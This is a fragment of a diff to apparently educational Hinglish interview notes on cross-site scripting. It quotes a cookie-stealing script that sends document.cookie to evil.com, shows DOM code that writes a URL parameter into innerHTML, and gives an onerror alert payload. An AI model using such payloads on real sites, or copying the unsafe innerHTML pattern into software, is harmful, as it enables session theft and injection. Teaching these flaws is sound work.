@@ -36,7 +36,7 @@ User ne comment mein `<script>fetch('https://evil.com?c='+document.cookie)</scri
          const name = new URLSearchParams(window.location.search).get('name');
            document.getElementById('greet').innerHTML = name;
 
-Agar URL ho ?name=<img src=x onerror=alert('XSS')>, toh browser me alert box show hoga
+         Agar URL ho ?name=<img src=x onerror=alert('XSS')>, toh browser me alert box show hoga
 
 - **Interview mein bolna:**  
 “Yahaan server safe hai, lekin client-side JS vulnerability hai—data sanitization miss, DOM me inject.”
